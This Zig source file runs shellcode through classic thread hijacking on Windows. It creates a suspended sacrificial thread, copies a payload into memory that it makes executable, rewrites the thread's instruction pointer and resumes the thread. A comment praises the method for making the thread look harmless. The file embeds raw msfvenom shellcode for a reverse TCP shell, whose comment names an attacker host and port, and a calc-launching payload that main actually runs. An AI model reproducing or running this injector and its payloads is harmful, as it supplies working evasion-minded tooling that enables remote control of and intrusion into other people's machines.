// NOTE:
// We run our payload in a hijacked thread instead of the one we created.
// This is because the entry of the thread we created must pointed to the
// base address of our payload in memory, while the hijacked one will pointed
// to the normal process function, so it will let the thread seems harmless,
// which is a good news for us.

const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

// Windows API types
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const PVOID = windows.PVOID;
const PBYTE = [*]u8;
const SIZE_T = windows.SIZE_T;
const WINAPI = windows.WINAPI;
const LPTHREAD_START_ROUTINE = *const fn (?*anyopaque) callconv(WINAPI) DWORD;

// Memory protection constants
const PAGE_READWRITE: DWORD = windows.PAGE_READWRITE;
const PAGE_EXECUTE_READWRITE: DWORD = windows.PAGE_EXECUTE_READWRITE;
const MEM_COMMIT: DWORD = windows.MEM_COMMIT;
const MEM_RESERVE: DWORD = windows.MEM_RESERVE;

// Thread creation constants
const CREATE_SUSPENDED: DWORD = 0x00000004;
const INFINITE: DWORD = 0xFFFFFFFF;

// Context flags
const CONTEXT_CONTROL: DWORD = 0x00000001;
const CONTEXT_ALL: DWORD = 0x00100000 | 0x00000001 | 0x00000002 | 0x00000004 | 0x00000008 | 0x00000010;

// Thread context structure for x64
const CONTEXT = extern struct {
    // Register parameter home addresses (reserved for debugger use)
    P1Home: u64,
    P2Home: u64,
    P3Home: u64,
    P4Home: u64,
    P5Home: u64,
    P6Home: u64,

    // Control flags
    ContextFlags: DWORD,
    MxCsr: DWORD,

    // Segment registers and processor flags
    SegCs: u16,
    SegDs: u16,
    SegEs: u16,
    SegFs: u16,
    SegGs: u16,
    SegSs: u16,
    EFlags: DWORD,

    // Debug registers
    Dr0: u64,
    Dr1: u64,
    Dr2: u64,
    Dr3: u64,
    Dr6: u64,
    Dr7: u64,

    // Integer registers
    Rax: u64,
    Rcx: u64,
    Rdx: u64,
    Rbx: u64,
    Rsp: u64,
    Rbp: u64,
    Rsi: u64,
    Rdi: u64,
    R8: u64,
    R9: u64,
    R10: u64,
    R11: u64,
    R12: u64,
    R13: u64,
    R14: u64,
    R15: u64,

    // Program counter
    Rip: u64,

    // Floating point state
    FltSave: [512]u8, // XMM_SAVE_AREA32

    // Vector registers
    VectorRegister: [26][16]u8,
    VectorControl: u64,

    // Special debug control registers
    DebugControl: u64,
    LastBranchToRip: u64,
    LastBranchFromRip: u64,
    LastExceptionToRip: u64,
    LastExceptionFromRip: u64,
};

// External function declarations
extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: SIZE_T,
    lpStartAddress: LPTHREAD_START_ROUTINE,
    lpParameter: ?*anyopaque,
    dwCreationFlags: DWORD,
    lpThreadId: ?*DWORD,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn VirtualAlloc(
    lpAddress: ?*anyopaque,
    dwSize: SIZE_T,
    flAllocationType: DWORD,
    flProtect: DWORD,
) callconv(WINAPI) ?*anyopaque;

extern "kernel32" fn VirtualProtect(
    lpAddress: *anyopaque,
    dwSize: SIZE_T,
    flNewProtect: DWORD,
    lpflOldProtect: *DWORD,
) callconv(WINAPI) BOOL;

extern "kernel32" fn GetThreadContext(
    hThread: HANDLE,
    lpContext: *CONTEXT,
) callconv(WINAPI) BOOL;

extern "kernel32" fn SetThreadContext(
    hThread: HANDLE,
    lpContext: *const CONTEXT,
) callconv(WINAPI) BOOL;

extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;
extern "kernel32" fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) callconv(WINAPI) DWORD;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;

// Payloads - converted from C arrays
// Netcat reverse shell payload (msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw)

const nc_payload = [_]u8{
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32,
    0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00,
    0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x1a, 0x0a, 0x7f, 0x00, 0x01, 0x01, 0x41, 0x54,
    0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89,
    0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50,
    0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0,
    0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10,
    0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
    0x48, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d,
    0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24,
    0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49,
    0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d, 0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79,
    0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08,
    0x87, 0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d,
    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x0a,
};

const calc_payload = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };

// Dummy function to use for the sacrificial thread
fn DummyFunction(lpParameter: ?*anyopaque) callconv(WINAPI) DWORD {
    _ = lpParameter; // Suppress unused parameter warning

    // Stupid code
    const seed = @as(u32, @intCast(std.time.timestamp()));
    var prng = std.Random.DefaultPrng.init(seed);
    const j = prng.random().int(i32);
    const i = j *% j; // Use wrapping multiplication to avoid overflow
    _ = i; // Suppress unused variable warning

    return 0;
}

// Classic thread hijacking function
fn runViaClassicThreadHijacking(hThread: HANDLE, pPayload: []const u8) bool {
    var pAddress: ?*anyopaque = null;
    var dwOldProtection: DWORD = 0;

    // .ContextFlags can be CONTEXT_CONTROL or CONTEXT_ALL as well
    var ThreadCtx = std.mem.zeroes(CONTEXT);
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    // NOTE:
    // In Zig, there's no implicit initialization like C, so we need
    // to manually set all other fields to be 0. While in C, the uninitialized
    // fields will be automatically set to 0.
    //
    // NOTE:
    // Reference C99 Standard 6.7.8.21:
    // If there are fewer initializers in a brace-enclosed list than there are
    // elements or members of an aggregate, or fewer characters in a string
    // literal used to initialize an array of known size than there are elements
    // in the array, the remainder of the aggregate shall be initialized implicitly
    // the same as objects that have static storage duration.
    //
    // NOTE: So the ThreadCtx above is equals to this:
    // var ThreadCtx = CONTEXT{
    //     .ContextFlags = CONTEXT_CONTROL,
    //     .P1Home = 0,
    //     .P2Home = 0,
    //     .P3Home = 0,
    //     .P4Home = 0,
    //     .P5Home = 0,
    //     .P6Home = 0,
    //     .MxCsr = 0,
    //     .SegCs = 0,
    //     .SegDs = 0,
    //     .SegEs = 0,
    //     .SegFs = 0,
    //     .SegGs = 0,
    //     .SegSs = 0,
    //     .EFlags = 0,
    //     .Dr0 = 0,
    //     .Dr1 = 0,
    //     .Dr2 = 0,
    //     .Dr3 = 0,
    //     .Dr6 = 0,
    //     .Dr7 = 0,
    //     .Rax = 0,
    //     .Rcx = 0,
    //     .Rdx = 0,
    //     .Rbx = 0,
    //     .Rsp = 0,
    //     .Rbp = 0,
    //     .Rsi = 0,
    //     .Rdi = 0,
    //     .R8 = 0,
    //     .R9 = 0,
    //     .R10 = 0,
    //     .R11 = 0,
    //     .R12 = 0,
    //     .R13 = 0,
    //     .R14 = 0,
    //     .R15 = 0,
    //     .Rip = 0,
    //     .FltSave = std.mem.zeroes([512]u8),
    //     .VectorRegister = std.mem.zeroes([26][16]u8),
    //     .VectorControl = 0,
    //     .DebugControl = 0,
    //     .LastBranchToRip = 0,
    //     .LastBranchFromRip = 0,
    //     .LastExceptionToRip = 0,
    //     .LastExceptionFromRip = 0,
    // };

    // Allocating memory for the payload
    const payload_size_dword: DWORD = @intCast(pPayload.len); // This is for adapting Win API param size
    pAddress = VirtualAlloc(null, payload_size_dword, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == null) {
        print("[!] VirtualAlloc Failed With Error : {d}\n", .{GetLastError()});
        return false;
    }

    // Copying the payload to the allocated memory
    const dest = @as([*]u8, @ptrCast(pAddress.?))[0..pPayload.len];
    @memcpy(dest, pPayload);

    // Changing the memory protection
    if (VirtualProtect(pAddress.?, payload_size_dword, PAGE_EXECUTE_READWRITE, &dwOldProtection) == 0) {
        print("[!] VirtualProtect Failed With Error : {d}\n", .{GetLastError()});
        return false;
    }

    // Getting the original thread context
    if (GetThreadContext(hThread, &ThreadCtx) == 0) {
        print("[!] GetThreadContext Failed With Error : {d}\n", .{GetLastError()});
        return false;
    }

    // Updating the next instruction pointer to be equal to the payload's address
    ThreadCtx.Rip = @intFromPtr(pAddress.?);

    // in case of a x64 payload injection : we change the value of `Rip`
    // in case of a x32 payload injection : we change the value of `Eip`

    // Setting the new updated thread context
    if (SetThreadContext(hThread, &ThreadCtx) == 0) {
        print("[!] SetThreadContext Failed With Error : {d}\n", .{GetLastError()});
        return false;
    }

    return true;
}

// Wait for user input (equivalent to getchar())
fn waitForEnter() void {
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

// Main function (equivalent to C main)
pub fn main() !void {
    var hThread: ?HANDLE = null;
    var dwThreadId: DWORD = 0;

    // Creating sacrificial thread in suspended state
    //
    // NOTE:
    // We can also use SuspendThread to suspend a thread.
    // To lean more: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread
    hThread = CreateThread(null, 0, &DummyFunction, null, CREATE_SUSPENDED, &dwThreadId);
    if (hThread == null) {
        print("[!] CreateThread Failed With Error : {d}\n", .{GetLastError()});
        return;
    }

    print("[i] Hijacking Thread Of Id : {d}\n", .{dwThreadId});

    // Hijacking the sacrificial thread created
    if (!runViaClassicThreadHijacking(hThread.?, &calc_payload)) {
        _ = CloseHandle(hThread.?);
        return;
    }
    print("[+] DONE\n", .{});
    print("[#] Press <Enter> To Run The Payload ...", .{});
    waitForEnter();

    // Resuming suspended thread, so that it runs our shellcode
    _ = ResumeThread(hThread.?);

    // Wait for the thread to complete
    _ = WaitForSingleObject(hThread.?, INFINITE);

    print("[#] Press <Enter> To Quit...", .{});
    waitForEnter();

    // Cleanup
    _ = CloseHandle(hThread.?);
}
